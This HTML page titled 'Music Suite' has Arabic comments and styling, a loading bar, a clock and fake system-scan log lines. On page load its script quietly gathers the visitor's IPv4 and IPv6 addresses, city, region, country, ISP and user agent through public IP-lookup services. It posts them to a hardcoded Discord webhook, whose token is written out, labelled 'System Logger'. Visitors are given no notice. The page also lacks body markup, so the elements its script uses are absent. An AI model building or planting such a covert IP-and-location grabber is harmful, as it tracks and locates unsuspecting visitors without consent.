<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Music Suite</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
            direction: rtl;
        }

        /* تأثير ومضة رقمية خفيفة عند التحميل الأول */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ff0000;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            animation: flash 0.4s ease-out;
        }

        @keyframes flash {
            0% {
                opacity: 0.2;
            }
            100% {
                opacity: 0;
            }
        }

        /* فيديو الخلفية المحسن مع التكرار التلقائي */
        .background-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
            opacity: 0.75;
        }

        /* طبقة عزل الظلال المتناسقة */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.25));
            z-index: -1;
        }

        /* شاشة التحميل المتكاملة */
        .loading-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 10;
            width: 100%;
        }

        /* شريط تقدم التحميل المضيء بالنيون الأحمر */
        .loading-bar-container {
            width: 420px;
            height: 16px;
            background: #111;
            border-radius: 30px;
            overflow: hidden;
            margin: 35px 0;
            border: 2px solid #ff3333;
            box-shadow: 0 0 25px rgba(255, 51, 51, 0.35);
        }

        .loading-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff6666, #ff0000);
            width: 0%;
            border-radius: 30px;
            animation: loading 3.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
            box-shadow: 0 0 15px #ff6666;
        }

        @keyframes loading {
            0% {
                width: 0%;
            }
            40% {
                width: 60%;
            }
            75% {
                width: 90%;
            }
            100% {
                width: 100%;
            }
        }

        /* العناوين والخطوط الرقمية */
        .main-title {
            font-size: 3.5em;
            color: #fff;
            margin: 20px 0;
            text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
            letter-spacing: 10px;
            animation: pulse-white 3s ease-in-out infinite;
        }

        @keyframes pulse-white {
            0%,
            100% {
                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
                transform: scale(1);
            }
            50% {
                text-shadow: 0 0 50px rgba(255, 255, 255, 1);
                transform: scale(1.02);
            }
        }

        .subtitle {
            font-size: 2em;
            color: #ccc;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            letter-spacing: 3px;
        }

        /* روابط الديسكورد المطلية بوهج ذهبي */
        .discord-link {
            font-size: 1.6em;
            color: #ffd700;
            margin-top: 40px;
            text-shadow: 0 0 10px #ffd700, 0 0 25px #ffec3d;
            letter-spacing: 2px;
            font-family: 'Courier New', monospace;
            animation: glow-gold 3s ease-in-out infinite alternate;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .discord-link:hover {
            color: #fff59d;
            text-shadow: 0 0 15px #fff59d, 0 0 35px #fff59d;
            transform: scale(1.06);
        }

        @keyframes glow-gold {
            from {
                text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700;
            }
            to {
                text-shadow: 0 0 20px #fffacd, 0 0 40px #fffacd;
            }
        }

        /* حاوية المحتوى الرئيسي */
        .main-content {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 10;
        }

        .logo-image {
            width: 210px;
            height: auto;
            margin-bottom: 25px;
            border-radius: 16px;
            box-shadow: 0 0 35px rgba(255, 255, 255, 0.25);
            animation: pulse-white 3s ease-in-out infinite;
            border: 2px solid rgba(255, 255, 255, 0.15);
        }

        /* نظام الجسيمات الخفيف والسلس */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: rgba(255, 51, 51, 0.35);
            border-radius: 50%;
            animation: float 6s infinite linear;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh);
                opacity: 1;
            }
            100% {
                transform: translateY(-10px);
                opacity: 0;
            }
        }

        .fade-out {
            animation: fadeOut 0.8s ease forwards;
        }
        @keyframes fadeOut {
            from {
                opacity: 1;
            }
            to {
                opacity: 0;
                visibility: hidden;
            }
        }

        .fade-in {
            animation: fadeIn 1.2s ease forwards;
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* حاوية بيانات المستخدم العلوية المحدثة */
        .top-left-status {
            position: fixed;
            top: 25px;
            left: 25px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 4px;
            font-family: 'Courier New', monospace;
            z-index: 1000;
            direction: ltr;
            background: rgba(0, 0, 0, 0.65);
            padding: 12px 20px;
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.08);
            min-width: 160px;
        }

        /* تنسيق الساعة الرقمية المضيئة */
        #clock {
            font-size: 1.5em;
            color: #00ff00;
            font-weight: bold;
            letter-spacing: 2px;
            text-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
        }

        /* سطر عرض بيانات الاتصال والموقع الجغرافي (تم إضافة الـ id المطلوب) */
        .status-text-block {
            font-size: 0.85em;
            color: #aaffaa;
            border-top: 1px solid rgba(0, 255, 0, 0.25);
            padding-top: 6px;
            margin-top: 4px;
            width: 100%;
            letter-spacing: 0.5px;
            text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
            direction: rtl;
            text-align: left;
            line-height: 1.6;
        }

        /* شريط معلومات النظام التفاعلي أسفل الشاشة */
        .bottom-logs {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Courier New', monospace;
            color: #ff3333;
            font-size: 1.1em;
            text-shadow: 0 0 8px #ff3333;
            z-index: 1000;
            direction: ltr;
            background: rgba(0, 0, 0, 0.65);
            padding: 5px 22px;
            border-radius: 4px;
            border: 1px solid rgba(255, 51, 51, 0.15);
        }

        /* مؤشر حالة النظام العام أسفل اليمين */
        .system-status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            font-size: 1em;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            z-index: 1000;
            display: flex;
            align-items: center;
            gap: 10px;
            text-shadow: 0 0 6px #00ff00;
        }

        .status-dot {
            width: 10px;
            height: 10px;
            background-color: #00ff00;
            border-radius: 50%;
            box-shadow: 0 0 10px #00ff00;
            animation: blink 1.2s infinite alternate;
        }

        @keyframes blink {
            from {
                opacity: 1;
            }
            to {
                opacity: 0.25;
            }
        }
    </style>
</head>

    <script>
        // ================================================================
        //  [التحسينات] الجزء الأول: دوال جلب IPv4 و IPv6 مع مهلة زمنية
        // ================================================================

        let currentNetworkData = {};

        // دالة مساعدة لإضافة مهلة زمنية للـ Fetch (إلغاء الطلب بعد 4 ثواني)
        function fetchWithTimeout(url, timeout = 4000) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);

            return fetch(url, {
                    signal: controller.signal,
                    headers: { 'Accept': 'application/json' }
                })
                .then(response => {
                    clearTimeout(timeoutId);
                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                    return response.json();
                })
                .catch(err => {
                    clearTimeout(timeoutId);
                    throw new Error(`Timeout or Network error: ${err.message}`);
                });
        }

        // جلب عنوان IP حسب الإصدار (v4 أو v6)
        async function fetchIPVersion(version) {
            const urls = {
                v4: [
                    'https://api.ipify.org?format=json',
                    'https://ipv4.icanhazip.com/' // يعيد نصاً، لكن سنتعامل معه كـ fallback
                ],
                v6: [
                    'https://api6.ipify.org?format=json',
                    'https://ipv6.icanhazip.com/'
                ]
            };

            const list = urls[version] || urls.v4;
            // حاول استخدام api.ipify.org أولاً (JSON)، ثم النصية كـ fallback
            for (const url of list) {
                try {
                    const resp = await fetchWithTimeout(url, 3000);
                    // إذا كانت الاستجابة نصية (من icanhazip) نحولها لكائن
                    if (typeof resp === 'string') {
                        const ip = resp.trim();
                        if (ip) return { ip };
                    }
                    // إذا كانت JSON
                    if (resp && resp.ip) {
                        return { ip: resp.ip };
                    }
                } catch (_) { /* تجاهل الخطأ وجرب التالي */ }
            }
            return null; // فشل جلب هذا الإصدار
        }

        // الدالة الرئيسية لجلب بيانات الشبكة (IPv4 و IPv6 + الموقع الجغرافي)
        async function fetchOptimizedNetworkData() {
            // 1. التحقق من الكاش أولاً (صلاحية ساعة واحدة)
            try {
                const cached = localStorage.getItem('user_geo_cache');
                if (cached) {
                    const parsed = JSON.parse(cached);
                    if (Date.now() - parsed.timestamp < 3600000) {
                        console.log('✅ استخدام بيانات مخزنة مؤقتاً');
                        return parsed.data;
                    }
                }
            } catch (e) { /* تجاهل خطأ الكاش */ }

            // 2. جلب كلا الإصدارين بشكل متوازٍ
            const [v4Result, v6Result] = await Promise.allSettled([
                fetchIPVersion('v4'),
                fetchIPVersion('v6')
            ]);

            const ipv4 = v4Result.status === 'fulfilled' && v4Result.value ? v4Result.value.ip : 'غير متاح';
            const ipv6 = v6Result.status === 'fulfilled' && v6Result.value ? v6Result.value.ip : 'غير متاح';

            // 3. جلب البيانات الجغرافية (باستخدام الخدمة الأسرع)
            const geoData = await fetchGeoLocation();

            // 4. دمج النتائج
            const result = {
                ipv4,
                ipv6,
                country: geoData?.country || 'غير معروف',
                region: geoData?.region || 'غير معروف',
                city: geoData?.city || 'غير معروف',
                isp: geoData?.isp || 'غير معروف'
            };

            // حفظ في الكاش مع الطابع الزمني
            localStorage.setItem('user_geo_cache', JSON.stringify({
                data: result,
                timestamp: Date.now()
            }));

            console.log('✅ تم جلب البيانات بنجاح:', result);
            return result;
        }

        // جلب الموقع الجغرافي من عدة خدمات (نفس الكود الأصلي مع تعديل بسيط)
        async function fetchGeoLocation() {
            const API_SOURCES = [{
                url: 'https://ipapi.co/json/',
                parser: (data) => ({
                    country: data.country_name || data.country || 'غير معروف',
                    region: data.region || 'غير معروف',
                    city: data.city || 'غير معروف',
                    isp: data.org || data.isp || 'غير معروف'
                })
            }, {
                url: 'https://ipwho.is/',
                parser: (data) => ({
                    country: data.country || 'غير معروف',
                    region: data.region || 'غير معروف',
                    city: data.city || 'غير معروف',
                    isp: data.connection?.isp || data.org || 'غير معروف'
                })
            }, {
                url: 'https://extreme-ip-lookup.com/json/',
                parser: (data) => ({
                    country: data.country || 'غير معروف',
                    region: data.region || 'غير معروف',
                    city: data.city || 'غير معروف',
                    isp: data.org || data.isp || 'غير معروف'
                })
            }];

            const fetchPromises = API_SOURCES.map(source =>
                fetchWithTimeout(source.url, 3000)
                .then(data => {
                    if (!data || (!data.ip && !data.query && !data.country)) {
                        throw new Error('بيانات غير مكتملة');
                    }
                    return source.parser(data);
                })
            );

            try {
                const result = await Promise.any(fetchPromises);
                return result;
            } catch (error) {
                console.error('❌ فشلت جميع خدمات جلب الموقع:', error);
                return null;
            }
        }

        // ================================================================
        //  [التحسينات] الجزء الثاني: تحديث الواجهة وإرسال Webhook
        // ================================================================

        function updateLocationUI(data) {
            const displayElement = document.getElementById('top-ip-display');
            if (displayElement) {
                displayElement.innerHTML = `
                        الدولة: ${data.country}<br>
                        المنطقة: ${data.region}<br>
                        المدينة: ${data.city}<br>
                        IPv4: ${data.ipv4}<br>
                        IPv6: ${data.ipv6}
                    `;
            }
        }

        function showOfflineUI() {
            const displayElement = document.getElementById('top-ip-display');
            if (displayElement) {
                displayElement.innerHTML = `
                        الدولة: فحص الشبكة...<br>
                        المنطقة: جاري التثبيت...<br>

                        IPv4: جاري التحميل...<br>
                        IPv6: جاري التحميل...
                    `;
            }
        }

        // دالة إرسال البيانات إلى Webhook (مع IPv4 و IPv6)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522122255327297667/2Sh-s4h-GgR_BaM8eexpMzzrO_7XimZavKHcbXMPDoPbhxIV5_yF020WA3AbTssRuXR8';

        function sendToWebhook(data) {
            if (!WEBHOOK_URL) return;
            const payload = {
                username: "System Logger",
                avatar_url: "",
                embeds: [{
                    title: "🌐 تسجيل دخول مستخدم جديد (IPv4 & IPv6)",
                    color: 15548997,
                    fields: [
                        { name: "📌 IPv4 Address", value: `\`${data.ipv4 || "غير متاح"}\``, inline: false },
                        { name: "📌 IPv6 Address", value: `\`${data.ipv6 || "غير متاح"}\``, inline: false },
                        { name: "🏳️ Country", value: data.country || "غير معروف", inline: true },
                        { name: "📍 Region", value: data.region || "غير معروف", inline: true },
                        { name: "🏙️ City", value: data.city || "غير معروف", inline: true },
                        { name: "🏢 ISP / Provider", value: data.isp || "غير معروف", inline: false },
                        { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Music System | " + new Date().toLocaleString('ar-EG') },
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log('خطأ ويب هوك.', err));
        }

        // ================================================================
        //  [التحسينات] الجزء الثالث: استدعاء الدالة الرئيسية
        // ================================================================

        async function fetchSystemNetworkData() {
            const data = await fetchOptimizedNetworkData();

            if (data && data.ipv4) {
                currentNetworkData = data;
                updateLocationUI(data);
                sendToWebhook(data);
            } else {
                showOfflineUI();
            }
        }

        // ================================================================
        //  باقي الكود الأصلي (الجسيمات، الساعة، السجلات، التحكم بالصوت، إلخ)
        // ================================================================

        // توليد حركة الجسيمات في الخلفية
        function createParticles() {
            const particles = document.getElementById('particles');
            if (!particles) return;
            for (let i = 0; i < 25; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 4 + 's';
                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
                particles.appendChild(particle);
                setTimeout(() => particle.remove(), 6000);
            }
        }
        setInterval(createParticles, 6000);
        createParticles();

        const music = document.getElementById('background-music');
        const glitchSound = document.getElementById('click-glitch-sound');
        const video = document.getElementById('bg-video');

        const playMedia = () => {
            if (music) {
                music.muted = false;
                music.volume = 1.0;
                music.play().catch(() => {});
            }
            if (video) {
                video.muted = true;
                video.play().catch(() => {});
            }
        };

        const activateInterface = () => {
            if (glitchSound) { glitchSound.volume = 0.4;
                glitchSound.play().catch(() => {}); }
            playMedia();
        };

        addEventListener('click', activateInterface, { once: true });
        addEventListener('keydown', activateInterface, { once: true });

        // تحديث الساعة الرقمية
        function updateClock() {
            const now = new Date();
            let hours = now.getHours();
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            const ampm = hours >= 12 ? 'PM' : 'AM';

            hours = hours % 12;
            hours = hours ? hours : 12;
            const formattedHours = String(hours).padStart(2, '0');

            const clockElement = document.getElementById('clock');
            if (clockElement) {
                clockElement.textContent = `${formattedHours}:${minutes}:${seconds} ${ampm}`;
            }
        }
        setInterval(updateClock, 1000);
        updateClock();

        // محاكاة سجلات فحص النظام التفاعلية
        const logsSequence = [
            "[SYS] STATUS: INITIALIZING SYSLOG...",
            "[NET] VERIFYING CONNECTION INTEGRITY...",
            "[SEC] CHECKING ENVIRONMENT NODE_7...",
            "[SYS] PRIVILEGES IDENTIFIED...",
            "[OK] PIPELINE SYNCED WITH TERMINAL."
        ];
        let logIndex = 0;
        setInterval(() => {
            const logElement = document.getElementById('terminal-logs');
            if (logElement) {
                logElement.textContent = logsSequence[logIndex];
                logIndex = (logIndex + 1) % logsSequence.length;
            }
        }, 3500);

        // التحكم في توقيت انتهاء شاشة التحميل والانتقال للمحتوى الأساسي
        const loadingBar = document.querySelector('.loading-bar');
        if (loadingBar) {
            loadingBar.addEventListener('animationend', () => {
                const loadingScreen = document.getElementById('loading-screen');
                const mainContent = document.getElementById('main-content');
                if (loadingScreen && mainContent) {
                    loadingScreen.classList.add('fade-out');
                    loadingScreen.addEventListener('animationend', () => {
                        loadingScreen.style.display = 'none';
                        mainContent.style.display = 'flex';
                        mainContent.classList.add('fade-in');
                        playMedia();
                    }, { once: true });
                }
            });
        }

        // بدء التشغيل التلقائي للفحص (باستخدام الدالة المحسّنة)
        fetchSystemNetworkData();
    </script>
